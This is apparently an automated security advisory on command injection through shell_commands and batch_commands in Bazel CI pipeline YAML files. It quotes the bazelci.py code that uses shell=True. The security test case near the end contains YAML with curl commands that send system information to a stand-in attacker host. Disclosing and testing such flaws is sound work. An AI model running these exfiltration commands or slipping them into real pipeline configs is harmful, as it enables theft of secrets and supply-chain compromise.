#### Vulnerability: YAML Command Injection in Pipeline Configuration

* **Description:**
    1. An attacker crafts a malicious pull request targeting a Bazel project utilizing Bazel CI.
    2. This pull request introduces modifications to a YAML pipeline configuration file, such as `.bazelci/presubmit.yml` or files within the `pipelines/` directory.
    3. Within the modified YAML file, the attacker injects arbitrary commands into sections designed for command execution, specifically `shell_commands` (for Linux/macOS) or `batch_commands` (for Windows). These injections exploit the YAML parsing and command execution mechanisms within the CI pipeline.
    4. A project maintainer, potentially unaware of the malicious YAML changes, reviews and merges the pull request.
    5. The Buildkite CI pipeline is triggered by the merged pull request, processing the modified YAML configuration.
    6. The CI system, using scripts like `bazelci.py`, parses the YAML and executes the commands specified in `shell_commands` or `batch_commands` sections. Due to the lack of input sanitization, the attacker's injected commands are executed directly on Bazel's CI infrastructure.

* **Impact:**
    - **Arbitrary code execution** on Bazel's CI machines.
    - **Critical compromise of Bazel's CI infrastructure**, potentially allowing the attacker to:
        - Access and exfiltrate sensitive information, including secrets, API keys, and internal source code.
        - Modify Bazel's source code repository or build artifacts, leading to supply chain attacks.
        - Tamper with the CI process itself, disrupting builds or injecting malicious code into software releases.
        - Use compromised CI machines as a launchpad for further attacks on internal systems.

* **Vulnerability Rank:** Critical

* **Currently Implemented Mitigations:**
    - **Documentation Warning:**  The `README.md` and `/buildkite/README.md` files contain a warning: "*Please vet external contributions carefully as they can execute arbitrary code on our CI machines*". This mitigation is purely informational, relying on manual vigilance during code review and does not technically prevent the vulnerability.
    - **Manual "Verify Pull Request" Status:** Buildkite's "Verify Pull Request" status is intended as a manual checkpoint to encourage maintainers to review external contributions. However, it is not a technical control and depends entirely on the thoroughness and security awareness of the reviewer.

* **Missing Mitigations:**
    - **Input Validation and Sanitization:** Lack of automated validation and sanitization of YAML configuration files. The system should implement robust input validation, particularly for fields that are interpreted as shell commands, to prevent the injection of malicious code. This includes escaping or sandboxing command execution.
    - **Secure YAML Parsing:** Ensure the use of secure YAML parsing practices, such as using `yaml.safe_load` in Python's PyYAML library, to prevent deserialization vulnerabilities that could lead to code execution during YAML parsing itself.
    - **Principle of Least Privilege:** CI pipeline tasks should operate with the minimum necessary privileges. Restricting the permissions of the CI execution environment can limit the potential damage from successful command injection.
    - **Automated Configuration Validation:** Implement automated tools and checks within the CI pipeline to parse and validate YAML configurations for security vulnerabilities before execution. This could include static analysis or security scanning tools tailored for YAML.
    - **Code Review Enforcement and Training:** Enforce mandatory code review policies, especially for changes to CI configuration files. Provide training to maintainers specifically focusing on YAML injection risks and secure code review practices for CI configurations.
    - **Sandboxing or Containerization:** Isolate CI pipeline tasks within sandboxes or containers. This would limit the impact of command injection by preventing access to the underlying CI infrastructure and restricting potential lateral movement.

* **Preconditions:**
    - The project must be using Bazel CI and Buildkite.
    - An attacker must be able to create a pull request to the Bazel project's repository.
    - A project maintainer with merge permissions must merge the attacker's pull request containing the malicious YAML configuration.

* **Source Code Analysis:**
    - The core logic for Bazel CI is located in `/code/buildkite/bazelci.py`. This script is responsible for parsing YAML configuration files and executing pipeline steps.
    - The `fetch_configs` and `load_config` functions in `bazelci.py` are responsible for loading and parsing YAML configuration files, likely using `yaml.safe_load` for YAML parsing.
    - The `execute_commands` function within `bazelci.py` handles the execution of commands defined in the YAML configuration. It extracts `shell_commands` and `batch_commands` from the parsed YAML.
    - The functions `execute_shell_commands` and `execute_batch_commands` within `bazelci.py` are used to execute the commands. Critically, these functions utilize `subprocess.run` with `shell=True`:

    ```python
    def execute_commands(...):
        ...
        if platform == "windows":
            execute_batch_commands(task_config.get("batch_commands", None), print_cmd_groups)
        else:
            execute_shell_commands(task_config.get("shell_commands", None), print_cmd_groups)

    def execute_shell_commands(commands, print_group=True, group_message=":bash: Setup (Shell Commands)"):
        ...
        shell_command = "\n".join(["set -e"] + commands)
        execute_command([shell_command], shell=True)

    def execute_batch_commands(commands, print_group=True, group_message=":batch: Setup (Batch Commands)"):
        ...
        batch_commands = "&".join(commands)
        return subprocess.run(batch_commands, shell=True, check=True, env=os.environ).returncode
    ```

    - **Vulnerability:** The use of `shell=True` in `subprocess.run` creates a command injection vulnerability. When `shell=True` is used, the first argument to `subprocess.run` is interpreted as a shell command string, allowing an attacker to inject arbitrary shell commands if they can control any part of this string. In this case, the attacker controls the `commands` list, which is directly derived from the YAML configuration.

    ```
    YAML Configuration (shell_commands/batch_commands) --> bazelci.py (execute_commands, execute_shell_commands/execute_batch_commands) --> subprocess.run(shell=True) --> Arbitrary Code Execution
    ```

* **Security Test Case:**
    1. **Fork the repository:** Fork the `bazelbuild/continuous-integration` repository (or any Bazel project using this CI setup) to your personal GitHub account.
    2. **Create a malicious branch:** Create a new branch in your forked repository, for example, `exploit-branch`.
    3. **Modify YAML Configuration:** Edit an existing YAML pipeline configuration file (e.g., `.bazelci/presubmit.yml` or `/code/pipelines/subpar.yml`).
    4. **Inject Malicious Command (Linux/macOS):** Within a task definition, add a `shell_commands` section and inject a command to verify execution and potentially exfiltrate data. For example:

    ```yaml
    tasks:
      vulnerable_task:
        platform: ubuntu2004
        shell_commands:
          - echo "YAML Injection Vulnerability Test"
          - whoami > /tmp/attack_info.txt
          - hostname >> /tmp/attack_info.txt
          - curl -F "file=@/tmp/attack_info.txt" https://attacker.example.com/exfiltrate # Replace with your server
    ```

    5. **Inject Malicious Command (Windows):** For Windows platforms, use `batch_commands` with equivalent commands:

    ```yaml
    tasks:
      vulnerable_task:
        platform: windows
        batch_commands:
          - echo "YAML Injection Vulnerability Test"
          - whoami > C:\attack_info.txt
          - hostname >> C:\attack_info.txt
          - curl -F "file=@C:\attack_info.txt" https://attacker.example.com/exfiltrate # Replace with your server
    ```

    6. **Create Pull Request:** Create a pull request from your `exploit-branch` to the original repository's `master` branch.
    7. **Trigger Pipeline:** If you have permissions or after a maintainer merges the PR (for testing purposes only, do not merge in a real scenario), the CI pipeline will be triggered.
    8. **Examine Build Logs:** In the Buildkite UI, navigate to the build logs for the task where you injected the command (`vulnerable_task`). Verify that the `echo`, `whoami`, and `hostname` commands were executed.
    9. **Verify Exfiltration (Optional):** If you used the `curl` command, check your attacker-controlled server (`https://attacker.example.com/exfiltrate`) for an incoming request containing the contents of `/tmp/attack_info.txt` or `C:\attack_info.txt`.
    10. **Verify Artifacts:**  You can also add a command to upload an artifact to Buildkite to easily verify the output of the injected commands: `- buildkite-agent artifact upload "/tmp/attack_info.txt"` (or `C:\attack_info.txt` on Windows). Check the artifacts tab in Buildkite for the uploaded file.
    11. **Important: Do Not Merge:**  **Do not merge the pull request** to the main repository as it contains a security vulnerability. This test case is solely for demonstration and validation in a controlled environment. Immediately close the pull request after testing and inform the security team.
